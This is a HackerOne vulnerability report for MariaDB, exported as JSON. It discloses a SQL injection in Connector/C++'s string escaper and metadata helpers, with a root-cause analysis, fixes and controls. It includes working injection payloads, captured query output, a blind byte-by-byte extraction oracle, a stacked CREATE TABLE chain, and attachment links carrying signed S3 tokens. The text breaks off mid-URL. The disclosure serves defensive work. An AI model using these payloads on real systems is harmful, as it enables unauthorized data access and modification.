@@ -1,0 +1,176 @@
+{
+  "id": 3890289,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODkwMjg5",
+  "url": "https://hackerone.com/reports/3890289",
+  "title": "Connector/C++ string escaper re-escapes its own output, enabling SQL injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-26T00:20:07.032Z",
+  "submitted_at": "2026-07-26T00:20:07.605Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fg0x0",
+    "url": "/fg0x0",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/we9mo7ui49vl91bznzyid2bvt1lf/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-11-04T11:39:07.315Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-11-04T11:39:07.166Z",
+  "team_member_agreed_on_going_public_at": "2026-11-04T11:17:17.083Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Utils::escapeString is the escaper behind every identifier and literal that MariaDbDatabaseMetaData interpolates into the information_schema queries it builds. It is implemented on top of sql::mariadb::replace, whose inner loop advances its search cursor by the length of the substitution instead of to the end of the substitution it just made. It therefore finds and re-escapes the characters it has itself inserted, emitting a run whose length depends on where the character sat in the input. For backslash doubling that run is frequently odd, which leaves one live escape character that consumes the closing quote of the literal. An application that passes an untrusted table, schema, or column name to a DatabaseMetaData method gets SQL injection.\n\n## Details\n\nThe defect is in src/util/String.cpp:64-76:\n\n```cpp\n  SQLString& replaceInternal(SQLString& str, const SQLString& _substr, const SQLString &subst)\n  {\n    size_t pos= 0, prev= 0;\n    ...\n    while ((pos= real.find(substr, prev)) != std::string::npos)\n    {\n      real.replace(pos, substr.length(), realSub);\n      prev+= realSub.length();\n    }\n```\n\nprev must become pos + realSub.length(). Instead it accumulates realSub.length() from zero, so after replacing a character at position p the next search starts at 2, 4, 6 and so on, which is behind p. The loop re-finds the inserted substitution and replaces it again, repeating until prev passes the run. One input character therefore becomes roughly p+1 output characters.\n\nUtils::escapeString (src/util/Utils.cpp:66-81) uses that helper for both of its passes:\n\n```cpp\n    SQLString escaped= replace(value, \"'\", \"''\");\n    if (noBackslashEscapes){\n      return escaped;\n    }\n    return replace(escaped, \"\\\\\", \"\\\\\\\\\");\n```\n\nQuote doubling always produces an even count, so it survives the multiplication. Backslash doubling does not: a single backslash at index 5 comes out as seven backslashes, an odd run, and the trailing one escapes the quote that follows.\n\nThere is a second, independent defect on the same path. Three sibling helpers in MariaDbDatabaseMetaData.cpp escape metadata arguments, and they do not agree:\n\n```cpp\n:526  return \"'\" + Utils::escapeString(value, connection->getProtocol()->noBackslashEscapes()) + \"'\";\n:570  return \"(\"+columnName +\" \"+predicate +\" '\" + Utils::escapeString(tableName,true)+\"')\";\n:580  return \"(\" + columnName + \" \" + predicate + \" '\" + Utils::escapeString(schemaName, true) + \"')\";\n```\n\nescapeQuote at :526 passes the live server flag. patternCond at :570 and schemaPatternCond at :580 hardcode true, which tells the escaper that backslash is not an escape character. Against a server whose sql_mode does not contain NO_BACKSLASH_ESCAPES, which is the default, backslash is an escape character, so those two helpers never escape it at all.\n\nEither defect alone is enough to break out. This was measured rather than assumed: a search over 336 payload shapes was run against four builds.\n\n```bash\n[STOCK HEAD c57f17f      ] payload shapes tried=336  injecting shapes=42\n[fix A only (escape flag)] payload shapes tried=336  injecting shapes=36\n[fix B only (replaceInt.)] payload shapes tried=336  injecting shapes=0\n[fix A + fix B           ] payload shapes tried=336  injecting shapes=0\n```\n\nCorrecting only the hardcoded flag leaves 36 working payload shapes, because the backslash doubling it enables is still multiplied into an odd run. Correcting replaceInternal closed every shape tried. Both should be fixed, and the durable fix is to route these through mysql_real_escape_string the way CONCPP-153 did for parameter values.\n\nThe reachable surface is the whole metadata layer. patternCond and schemaPatternCond are used by getTables, getColumns, getPrimaryKeys, getProcedures, getProcedureColumns, getFunctions, getFunctionColumns, getColumnPrivileges and getTablePrivileges. escapeQuote, which shares the broken replace, feeds a further fourteen catalogCond call sites. MariaDbConnection::quoteIdentifier (:85-87) and the public MariaDbStatement::enquoteIdentifier (:375) are built on the same replace, so the driver's own identifier-quoting API is affected too.\n\n## PoC\n\n1. Start MariaDB 11.4 with default sql_mode. Create schema pocdb with tables alpha and zsecret, and schema otherdb with table alpha.\n\n2. Have the application call getTables asking only for the single table \"alpha\". Benign control:\n\n```bash\n=== BENIGN CONTROL: tableNamePattern = \"alpha\" ===\n        row: pocdb.alpha\n    [benign] rows=1\n```\n\n3. Pass an untrusted name instead. tableNamePattern = alpha\\' OR 1=1 OR TABLE_NAME LIKE ' The driver emits, as captured from the server general log:\n\n```bash\nWHERE (TABLE_SCHEMA = 'pocdb') AND (TABLE_NAME LIKE 'alpha\\'''''''' OR 1=1 OR TABLE_NAME LIKE '''''''''''''''''''''''''''''')\n```\n\n   The backslash consumes the first quote, three pairs become literal quotes, the seventh closes the literal, and OR 1=1 lands in code position:\n\n```bash\n=== POSITIVE 1: literal breakout, force the predicate true ===\n        row: pocdb.alpha\n        row: pocdb.zsecret\n    [OR 1=1] rows=2\n```\n\n   zsecret is returned although the application asked only for alpha.\n\n4. Inject through schemaPattern instead and the schema restriction is bypassed, returning a table from a different database:\n\n```bash\n=== POSITIVE 2: cross-schema, inject via schemaPattern ===\n        row: otherdb.alpha\n        row: pocdb.alpha\n    [schema OR 1=1] rows=2\n```\n\n5. The same breakout supports a subquery, which gives a boolean oracle and byte-by-byte extraction. The application still only ever asks for table alpha:\n\n```bash\n  control: 1=1                        rows=2  TRUE\n  control: 1=2                        rows=0  FALSE\n  mysql.user count > 100              rows=0  FALSE\n  mysql.user count > 0                rows=2  TRUE\n  @@version starts with '1' (0x31)    rows=2  TRUE\n  @@version starts with '9' (0x39)    rows=0  FALSE\n\nByte-by-byte extraction of @@version via the same oracle:\n  recovered @@version prefix = \"11?4?1\"\n```\n\n   The two ? are '.' characters, which sit below the 0x30 floor of the scan loop.\n\n6. Negative control. Correcting replaceInternal (poc/fix/F2_rootcause_fix.diff) and re-running the same 336 payload shapes yields zero injecting shapes, and the same payloads now emit a correctly escaped literal.\n\nScenario A (sanity): \ngetTables(schema=pocdb, table=\"alpha\") -> rows=1, exactly the table requested Scenario B (negative control):\nreplaceInternal-fixed build (poc/fix/F2_rootcause_fix.diff) -> 0 of 336 payload shapes inject Scenario C (attack):\nstock HEAD -> 42 of 336 shapes inject; pocdb.zsecret returned unasked; otherdb.alpha returned across the schema restriction; @@version recovered byte by byte\n\nArtifacts:\n- poc/poc_evidence.txt, full transcript including benign and fixed controls\n- poc/poc_sqli.cpp, poc/poc_exfil.cpp, poc/poc_injsearch.cpp, poc/poc_chain2.cpp\n- poc/fix/F2_rootcause_fix.diff, poc/fix/F2_one_line_fix.diff, poc/fix/F2_both_fixes.diff\n- Affected: src/util/String.cpp:64-76, src/util/Utils.cpp:66-81,\n  src/MariaDbDatabaseMetaData.cpp:570 and :580, at HEAD c57f17f\n\nPreconditions, stated plainly. The attacker must control a string the application hands to a DatabaseMetaData method. Applications that let a user pick a table or schema to inspect, database tooling and admin consoles, ORMs that reflect schema using a caller-supplied name, and multi-tenant services that derive a schema name from tenant input all match that shape. Applications that only ever pass compile-time constants are not affected. No non-default connection option is required, and the server needs only its default sql_mode.\n\n## Impact\n\nDemonstrated on a running server: rows the application did not ask for, disclosure across a database boundary that the caller explicitly restricted, and blind byte-by-byte extraction of arbitrary server-side values through a boolean oracle.\n\nThe write side follows from a separate defect reported alongside this one. Connector/C++ passes the literal CLIENT_MULTI_STATEMENTS to mysql_real_connect at ConnectProtocol.cpp:474 and discards the capability mask it computed, so stacked statements are always enabled even with allowMultiQueries left at its default of false. Chained, a getTables argument executes arbitrary additional statements. This was confirmed end to end: the statement pair below created a table.\n\n```\nWHERE (TABLE_SCHEMA = 'pocdb') AND (TABLE_NAME LIKE 'alpha\\'''''''') ; CREATE TABLE pocdb.canary_c (id INT); -- ')\n```",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6323596,
+      "file_name": "poc_sqli.cpp",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6r81g6pz61y6dtgxw2egc07mi9ae?response-content-disposition=attachment%3B%20filename%3D%22poc_sqli.cpp%22%3B%20filename%2A%3DUTF-8%27%27poc_sqli.cpp&response-content-type=text%2Fx-c%2B%2Bsrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWIPS3YKE%2F20261104%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261104T164503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCFZWszLNKilpEUDMcEeVRQ1V0YEi4AcHLXxcLNhoMPAQIgCR8k01wNlYvGtmiW5uCcve0VZ7j7XFf8AYByoiwJimEqugUIrf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO82%2Fc0PGEf2Aqte%2FCqOBd7h5bE8pBdXmZDSRoCo4Xa9ZK%2Bvapm1WwUY8%2FTfog2HnFFWEjxfCXNEn19Zm3xjUoMIRMRsswuDSh5bwiug2IYkLk%2Fy8895fC%2FS%2FJF7Iyf0ZTg9bKsQykKinwKSDhUSpUDh8jGnGd%2BWfVw%2FeWmRgxInq6dOufmo868u5sop2smWYJS9Xj2Bn29T%2B0HjCBYacpF2Zz%2Bn9z2ivdiSZfEK9DH%2BEpZyPwVE%2BNRh22iRQ4aNVIOFdFC6iGqC3nllwRCs2QyvGFQiYARyJhL9bPXjBjkr0fdoOm7px6E0XGqHCgcZzRSZlFNEHcv0B%2Fhf22PluZm%2F307C0D7RSq7C%2FKYmfc8t8CkcOogdXiE37AzYQt41dlmGKrgDe4%2Fw%2FsFa6sl0sdOo4iszk6jtGfQZu3%2Fw4PDPeHHF8vdKKh4fU8aT57IirWv2mZSojlny7Dq0fRi0Qh3MwRUXIQBK8z5qc0zd5Pr8%2BjHmNvalR84W6YLtaLp9o6VBGvxTQGb%2BVUED8hN9UXkxR1lOzahOTV%2ByeuRlpD01%2BHdBljwD9uwDZP6MCgl0KYuGsj%2FSxNIs6gckY399oV32MNbp%2BPu1jbEYYu8GvpY8md26qODe%2BVaXlDHVNpe8mlstYJHPPg%2BrU8kAJuS8nTf9bwCLrcjFhJ1tqJiQct1kDHQHIAKXuXY3WyggQbR4WM3cEXF%2BzOr0LeJEIfrxVyyJiblAsID3XZp81J9Ce0RVPUUpwUjnKUd9HUFrYgDwchk5D6fyNkfiyA%2B4z7MIWZ0RQPnh4RQKdi2FQm8qVgsH%2FtbkSwUdhkjT5BCv1lO93rM7ZDuVdMyg520cOPhacND6%2FhVa5Kbgu13S%2F92mLhVIJois9x8OdTrjYa37wTDauazXBjqxAcUv7cxktVIfFDCXDuX%2BUOfh5LBpUspNJE8TPd089mx9xlH0O5fU5rHdjjPI%2BP4fRvQE4%2BgLQ%2Fy6ThQ6RZcyjTvR6slPqSDKvMi5bFzYndkIvgypLOYB1WHw1v6%2BAD8F%2B48p64LL6Ur%2BMOkdmvG%2Fakj3bR%2F47eyjTwpCoT2eZAu67cS3bYupId%2BMYz7upRP7B1dj43updYNW85%2BaksjK7m9l2bwV97p6l1NmL0Qg2ivS9Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d6df59d22c9e814a7d5613aba049002ba388e39a4dda06dec842bd9802dda113",
+      "file_size": 3287,
+      "type": "text/x-c++src",
+      "moderated": null
+    },
+    {
+      "id": 6323597,
+      "file_name": "poc_exfil.cpp",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1iqm63otfkw7fcv588j79ftkis1b?response-content-disposition=attachment%3B%20filename%3D%22poc_exfil.cpp%22%3B%20filename%2A%3DUTF-8%27%27poc_exfil.cpp&response-content-type=text%2Fx-c%2B%2Bsrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWIPS3YKE%2F20261104%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261104T164503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCFZWszLNKilpEUDMcEeVRQ1V0YEi4AcHLXxcLNhoMPAQIgCR8k01wNlYvGtmiW5uCcve0VZ7j7XFf8AYByoiwJimEqugUIrf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO82%2Fc0PGEf2Aqte%2FCqOBd7h5bE8pBdXmZDSRoCo4Xa9ZK%2Bvapm1WwUY8%2FTfog2HnFFWEjxfCXNEn19Zm3xjUoMIRMRsswuDSh5bwiug2IYkLk%2Fy8895fC%2FS%2FJF7Iyf0ZTg9bKsQykKinwKSDhUSpUDh8jGnGd%2BWfVw%2FeWmRgxInq6dOufmo868u5sop2smWYJS9Xj2Bn29T%2B0HjCBYacpF2Zz%2Bn9z2ivdiSZfEK9DH%2BEpZyPwVE%2BNRh22iRQ4aNVIOFdFC6iGqC3nllwRCs2QyvGFQiYARyJhL9bPXjBjkr0fdoOm7px6E0XGqHCgcZzRSZlFNEHcv0B%2Fhf22PluZm%2F307C0D7RSq7C%2FKYmfc8t8CkcOogdXiE37AzYQt41dlmGKrgDe4%2Fw%2FsFa6sl0sdOo4iszk6jtGfQZu3%2Fw4PDPeHHF8vdKKh4fU8aT57IirWv2mZSojlny7Dq0fRi0Qh3MwRUXIQBK8z5qc0zd5Pr8%2BjHmNvalR84W6YLtaLp9o6VBGvxTQGb%2BVUED8hN9UXkxR1lOzahOTV%2ByeuRlpD01%2BHdBljwD9uwDZP6MCgl0KYuGsj%2FSxNIs6gckY399oV32MNbp%2BPu1jbEYYu8GvpY8md26qODe%2BVaXlDHVNpe8mlstYJHPPg%2BrU8kAJuS8nTf9bwCLrcjFhJ1tqJiQct1kDHQHIAKXuXY3WyggQbR4WM3cEXF%2BzOr0LeJEIfrxVyyJiblAsID3XZp81J9Ce0RVPUUpwUjnKUd9HUFrYgDwchk5D6fyNkfiyA%2B4z7MIWZ0RQPnh4RQKdi2FQm8qVgsH%2FtbkSwUdhkjT5BCv1lO93rM7ZDuVdMyg520cOPhacND6%2FhVa5Kbgu13S%2F92mLhVIJois9x8OdTrjYa37wTDauazXBjqxAcUv7cxktVIfFDCXDuX%2BUOfh5LBpUspNJE8TPd089mx9xlH0O5fU5rHdjjPI%2BP4fRvQE4%2BgLQ%2Fy6ThQ6RZcyjTvR6slPqSDKvMi5bFzYndkIvgypLOYB1WHw1v6%2BAD8F%2B48p64LL6Ur%2BMOkdmvG%2Fakj3bR%2F47eyjTwpCoT2eZAu67cS3bYupId%2BMYz7upRP7B1dj43updYNW85%2BaksjK7m9l2bwV97p6l1NmL0Qg2ivS9Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=072ceb436c33db2e2205d6130495925fca3a806e14af2853cccdcfef6c97e3a7",
+      "file_size": 3961,
+      "type": "text/x-c++src",
+      "moderated": null
+    },
+    {
+      "id": 6323599,
+      "file_name": "poc_sqli_variants.cpp",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/s3dlnlbtrn6jsl9bqqzdnz5fl9w7?response-content-disposition=attachment%3B%20filename%3D%22poc_sqli_variants.cpp%22%3B%20filename%2A%3DUTF-8%27%27poc_sqli_variants.cpp&response-content-type=text%2Fx-c%2B%2Bsrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWIPS3YKE%2F20261104%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261104T164503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCFZWszLNKilpEUDMcEeVRQ1V0YEi4AcHLXxcLNhoMPAQIgCR8k01wNlYvGtmiW5uCcve0VZ7j7XFf8AYByoiwJimEqugUIrf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO82%2Fc0PGEf2Aqte%2FCqOBd7h5bE8pBdXmZDSRoCo4Xa9ZK%2Bvapm1WwUY8%2FTfog2HnFFWEjxfCXNEn19Zm3xjUoMIRMRsswuDSh5bwiug2IYkLk%2Fy8895fC%2FS%2FJF7Iyf0ZTg9bKsQykKinwKSDhUSpUDh8jGnGd%2BWfVw%2FeWmRgxInq6dOufmo868u5sop2smWYJS9Xj2Bn29T%2B0HjCBYacpF2Zz%2Bn9z2ivdiSZfEK9DH%2BEpZyPwVE%2BNRh22iRQ4aNVIOFdFC6iGqC3nllwRCs2QyvGFQiYARyJhL9bPXjBjkr0fdoOm7px6E0XGqHCgcZzRSZlFNEHcv0B%2Fhf22PluZm%2F307C0D7RSq7C%2FKYmfc8t8CkcOogdXiE37AzYQt41dlmGKrgDe4%2Fw%2FsFa6sl0sdOo4iszk6jtGfQZu3%2Fw4PDPeHHF8vdKKh4fU8aT57IirWv2mZSojlny7Dq0fRi0Qh3MwRUXIQBK8z5qc0zd5Pr8%2BjHmNvalR84W6YLtaLp9o6VBGvxTQGb%2BVUED8hN9UXkxR1lOzahOTV%2ByeuRlpD01%2BHdBljwD9uwDZP6MCgl0KYuGsj%2FSxNIs6gckY399oV32MNbp%2BPu1jbEYYu8GvpY8md26qODe%2BVaXlDHVNpe8mlstYJHPPg%2BrU8kAJuS8nTf9bwCLrcjFhJ1tqJiQct1kDHQHIAKXuXY3WyggQbR4WM3cEXF%2BzOr0LeJEIfrxVyyJiblAsID3XZp81J9Ce0RVPUUpwUjnKUd9HUFrYgDwchk5D6fyNkfiyA%2B4z7MIWZ0RQPnh4RQKdi2FQm8qVgsH%2FtbkSwUdhkjT5BCv1lO93rM7ZDuVdMyg520cOPhacND6%2FhVa5Kbgu13S%2F92mLhVIJois9x8OdTrjYa37wTDauazXBjqxAcUv7cxktVIfFDCXDuX%2BUOfh5LBpUspNJE8TPd089mx9xlH0O5fU5rHdjjPI%2BP4fRvQE4%2BgLQ%2Fy6ThQ6RZcyjTvR6slPqSDKvMi5bFzYndkIvgypLOYB1WHw1v6%2BAD8F%2B48p64LL6Ur%2BMOkdmvG%2Fakj3bR%2F47eyjTwpCoT2eZAu67cS3bYupId%2BMYz7upRP7B1dj43updYNW85%2BaksjK7m9l2bwV97p6l1NmL0Qg2ivS9Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=718551b8ab6d1cea3fe768a4d058fd25b2d8160bab73a68757fe40d7a18ae747",
+      "file_size": 1964,
+      "type": "text/x-c++src",
+      "moderated": null
+    },
+    {
+      "id": 6323600,
+      "file_name": "run_poc.sh",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/lddiqg3upi26syzts67gqrn8l2tx?response-content-disposition=attachment%3B%20filename%3D%22run_poc.sh%22%3B%20filename%2A%3DUTF-8%27%27run_poc.sh&response-content-type=application%2Fx-sh&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWIPS3YKE%2F20261104%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261104T164503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCFZWszLNKilpEUDMcEeVRQ1V0YEi4AcHLXxcLNhoMPAQIgCR8k01wNlYvGtmiW5uCcve0VZ7j7XFf8AYByoiwJimEqugUIrf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO82%2Fc0PGEf2Aqte%2FCqOBd7h5bE8pBdXmZDSRoCo4Xa9ZK%2Bvapm1WwUY8%2FTfog2HnFFWEjxfCXNEn19Zm3xjUoMIRMRsswuDSh5bwiug2IYkLk%2Fy8895fC%2FS%2FJF7Iyf0ZTg9bKsQykKinwKSDhUSpUDh8jGnGd%2BWfVw%2FeWmRgxInq6dOufmo868u5sop2smWYJS9Xj2Bn29T%2B0HjCBYacpF2Zz%2Bn9z2ivdiSZfEK9DH%2BEpZyPwVE%2BNRh22iRQ4aNVIOFdFC6iGqC3nllwRCs2QyvGFQiYARyJhL9bPXjBjkr0fdoOm7px6E0XGqHCgcZzRSZlFNEHcv0B%2Fhf22PluZm%2F307C0D7RSq7C%2FKYmfc8t8CkcOogdXiE37AzYQt41dlmGKrgDe4%2Fw%2FsFa6sl0sdOo4iszk6jtGfQZu3%2Fw4PDPeHHF8vdKKh4fU8aT57IirWv2mZSojlny7Dq0fRi0Qh3MwRUXIQBK8z5qc0zd5Pr8%2BjHmNvalR84W6YLtaLp9o6VBGvxTQGb%2BVUED8hN9UXkxR1lOzahOTV%2ByeuRlpD01%2BHdBljwD9uwDZP6MCgl0KYuGsj%2FSxNIs6gckY399oV32MNbp%2BPu1jbEYYu8GvpY8md26qODe%2BVaXlDHVNpe8mlstYJHPPg%2BrU8kAJuS8nTf9bwCLrcjFhJ1tqJiQct1kDHQHIAKXuXY3WyggQbR4WM3cEXF%2BzOr0LeJEIfrxVyyJiblAsID3XZp81J9Ce0RVPUUpwUjnKUd9HUFrYgDwchk5D6fyNkfiyA%2B4z7MIWZ0RQPnh4RQKdi2FQm8qVgsH%2FtbkSwUdhkjT5BCv1lO93rM7ZDuVdMyg520cOPhacND6%2FhVa5Kbgu13S%2F92mLhVIJois9x8OdTrjYa37wTDauazXBjqxAcUv7cxktVIfFDCXDuX%2BUOfh5LBpUspNJE8TPd089mx9xlH0O5fU5rHdjjPI%2BP4fRvQE4%2BgLQ%2Fy6ThQ6RZcyjTvR6slPqSDKvMi5bFzYndkIvgypLOYB1WHw1v6%2BAD8F%2B48p64LL6Ur%2BMOkdmvG%2Fakj3bR%2F47eyjTwpCoT2eZAu67cS3bYupId%2BMYz7upRP7B1dj43updYNW85%2BaksjK7m9l2bwV97p6l1NmL0Qg2ivS9Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c061616a924a6724cd2b9bc58eab608cc6bf3ce51d092882ec648a79050c81e8",
+      "file_size": 8889,
+      "type": "application/x-sh",
+      "moderated": null
+    },
+    {
+      "id": 6323601,
+      "file_name": "poc_evidence.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/l8p53ts3gf1qrre37m7pgmq4ahrv?response-content-disposition=attachment%3B%20filename%3D%22poc_evidence.txt%22%3B%20filename%2A%3DUTF-8%27%27poc_evidence.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWIPS3YKE%2F20261104%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261104T164503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCFZWszLNKilpEUDMcEeVRQ1V0YEi4AcHLXxcLNhoMPAQIgCR8k01wNlYvGtmiW5uCcve0VZ7j7XFf8AYByoiwJimEqugUIrf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO82%2Fc0PGEf2Aqte%2FCqOBd7h5bE8pBdXmZDSRoCo4Xa9ZK%2Bvapm1WwUY8%2FTfog2HnFFWEjxfCXNEn19Zm3xjUoMIRMRsswuDSh5bwiug2IYkLk%2Fy8895fC%2FS%2FJF7Iyf0ZTg9bKsQykKinwKSDhUSpUDh8jGnGd%2BWfVw%2FeWmRgxInq6dOufmo868u5sop2smWYJS9Xj2Bn29T%2B0HjCBYacpF2Zz%2Bn9z2ivdiSZfEK9DH%2BEpZyPwVE%2BNRh22iRQ4aNVIOFdFC6iGqC3nllwRCs2QyvGFQiYARyJhL9bPXjBjkr0fdoOm7px6E0XGqHCgcZzRSZlFNEHcv0B%2Fhf22PluZm%2F307C0D7RSq7C%2FKYmfc8t8CkcOogdXiE37AzYQt41dlmGKrgDe4%2Fw%2FsFa6sl0sdOo4iszk6jtGfQZu3%2Fw4PDPeHHF8vdKKh4fU8aT57IirWv2mZSojlny7Dq0fRi0Qh3MwRUXIQBK8z5qc0zd5Pr8%2BjHmNvalR84W6YLtaLp9o6VBGvxTQGb%2BVUED8hN9UXkxR1lOzahOTV%2ByeuRlpD01%2BHdBljwD9uwDZP6MCgl0KYuGsj%2FSxNIs6gckY399oV32MNbp%2BPu1jbEYYu8GvpY8md26qODe%2BVaXlDHVNpe8mlstYJHPPg%2BrU8kAJuS8nTf9bwCLrcjFhJ1tqJiQct1kDHQHIAKXuXY3WyggQbR4WM3cEXF%2BzOr0LeJEIfrxVyyJiblAsID3XZp81J9Ce0RVPUUpwUjnKUd9HUFrYgDwchk5D6fyNkfiyA%2B4z7MIWZ0RQPnh4RQKdi2FQm8qVgsH%2FtbkSwUdhkjT5BCv1lO93rM7ZDuVdMyg520cOPhacND6%2FhVa5Kbgu13S%2F92mLhVIJois9x8OdTrjYa37wTDauazXBjqxAcUv7cxktVIfFDCXDuX%2BUOfh5LBpUspNJE8TPd089mx9xlH0O5fU5rHdjjPI%2BP4fRvQE4%2BgLQ%2Fy6ThQ6RZcyjTvR6slPqSDKvMi5bFzYndkIvgypLOYB1WHw1v6%2BAD8F%2B48p64LL6Ur%2BMOkdmvG%2Fakj3bR%2F47eyjTwpCoT2eZAu67cS3bYupId%2BMYz7upRP7B1dj43updYNW85%2BaksjK7m9l2bwV97p6l1NmL0Qg2ivS9Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5ea0945451518f07c4a613b867ddd9a26995829483fa2d951a426a95123ce7da",
+      "file_size": 10182,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 6323602,
+      "file_name": "rootcause_fix.diff",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ujtq8vo2qk9mvgd95z2js3yjgcym?response-content-disposition=attachment%3B%20filename%3D%22rootcause_fix.diff%22%3B%20filename%2A%3DUTF-8%27%27rootcause_fix.diff&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWIPS3YKE%2F20261104%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261104T164503Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCFZWszLNKilpEUDMcEeVRQ1V0YEi4AcHLXxcLNhoMPAQIgCR8k01wNlYvGtmiW5uCcve0VZ7j7XFf8AYByoiwJimEqugUIrf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO82%2Fc0PGEf2Aqte%2FCqOBd7h5bE8pBdXmZDSRoCo4Xa9ZK%2Bvapm1WwUY8%2FTfog2HnFFWEjxfCXNEn19Zm3xjUoMIRMRsswuDSh5bwiug2IYkLk%2Fy8895fC%2FS%2FJF7Iyf0ZTg9bKsQykKinwKSDhUSpUDh8jGnGd%2BWfVw%2FeWmRgxInq6dOufmo868u5sop2smWYJS9Xj2Bn29T%2B0HjCBYacpF2Zz%2Bn9z2ivdiSZfEK9DH%2BEpZyPwVE%2BNRh22iRQ4aNVIOFdFC6iGqC3nllwRCs2QyvGFQiYARyJhL9bPXjBjkr0fdoOm7px6E0XGqHCgcZzRSZlFNEHcv0B%2Fhf22PluZm%2F307C0D7R